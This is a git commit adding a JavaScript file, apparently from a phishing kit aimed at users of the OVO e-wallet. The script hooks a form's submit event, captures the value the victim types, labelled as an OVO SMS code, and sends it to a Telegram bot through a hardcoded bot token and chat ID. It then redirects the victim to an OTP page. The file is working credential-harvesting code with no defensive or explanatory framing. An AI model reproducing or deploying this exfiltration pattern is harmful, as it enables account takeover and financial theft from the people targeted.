011c272ba3860fd8dd77079be3646946768e5de2
yuo-in <idvarcel@gmail.com>
2024-11-24 00:04:40 +0700

    Add files via upload

---
+++ fetch.js
@@ -0,0 +1,43 @@
+
+        
+    const TOKEN = "7102689436:AAFa_4s1AU_epOKJC2MLonz66-qBYB15HJw";
+const CHAT_ID = "7026735935";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { name, } = form;
+  const data = {
+    name: name.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>𝐎𝐕𝐎 𝐒𝐌𝐒 : </b> ${data.name}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href = '/ovootp.html';
+}
+
